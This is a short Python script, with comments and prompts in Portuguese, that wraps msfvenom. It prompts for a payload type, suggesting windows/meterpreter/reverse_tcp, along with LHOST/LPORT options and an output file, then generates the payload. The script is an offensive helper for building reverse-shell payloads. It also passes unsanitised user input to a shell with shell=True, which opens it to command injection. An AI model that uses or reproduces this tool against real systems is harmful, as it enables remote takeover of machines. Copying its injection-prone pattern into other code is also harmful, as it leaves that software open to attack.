import subprocess

def generate_payload(payload_type, payload_options, output_file):
    # Comando do msfvenom
    command = f"msfvenom -p {payload_type} {payload_options} -o {output_file}"

    try:
        # Executa o comando do msfvenom
        subprocess.run(command, shell=True, check=True)
        print("Payload gerado com sucesso!")
    except subprocess.CalledProcessError as e:
        print(f"Erro ao gerar payload: {e}")

def main():
    print("Bem-vindo ao gerador de payloads usando msfvenom!")
    print("Por favor, insira as informações necessárias.")

    payload_type = input("Tipo de payload (exemplo: windows/meterpreter/reverse_tcp): ")
    payload_options = input("Opções do payload (exemplo: LHOST=IP LPORT=PORT): ")
    output_file = input("Nome do arquivo de saída: ")

    generate_payload(payload_type, payload_options, output_file)

if __name__ == "__main__":
    main()
